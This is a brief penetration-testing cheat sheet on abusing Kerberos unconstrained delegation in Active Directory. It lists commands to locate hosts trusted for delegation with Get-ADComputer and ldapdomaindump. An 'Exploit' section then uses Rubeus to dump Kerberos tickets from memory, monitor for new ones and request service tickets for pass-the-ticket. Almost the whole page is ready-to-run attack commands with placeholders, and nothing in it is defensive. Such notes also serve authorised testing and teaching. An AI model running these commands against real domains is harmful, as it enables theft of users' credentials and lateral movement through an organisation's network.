---
description: Unconstrained delegation
---

# KUD

## **Theory**

> An attacker with admin rights on a local server with unconstrained delegation will have access to the TGT of all the users that have been connected to the server

## **Method**

### **Find the delegation**

* From Windows: [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)
  * `PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
* From Unix: [https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
  * `ldapdomaindump -u "<DOMAIN>\<USERNAME>" -p "<PWD>" <IP>`
  * Then grep the unconstrained delegation from the DUMP: `grep TRUSTED_FOR_DELEGATION domain_computers.grep`

### **Exploit**

* Dump TGT from the memory : `.\Rubeus.exe dump`
* Dump in live the new TGT after each success : `\Rubeus.exe monitor /interval:5`
* Grab the TGS using a TGT : `.\Rubeus.exe asktgs /ticket:<TICKET_BASE64> /service:<SPN> /ptt`
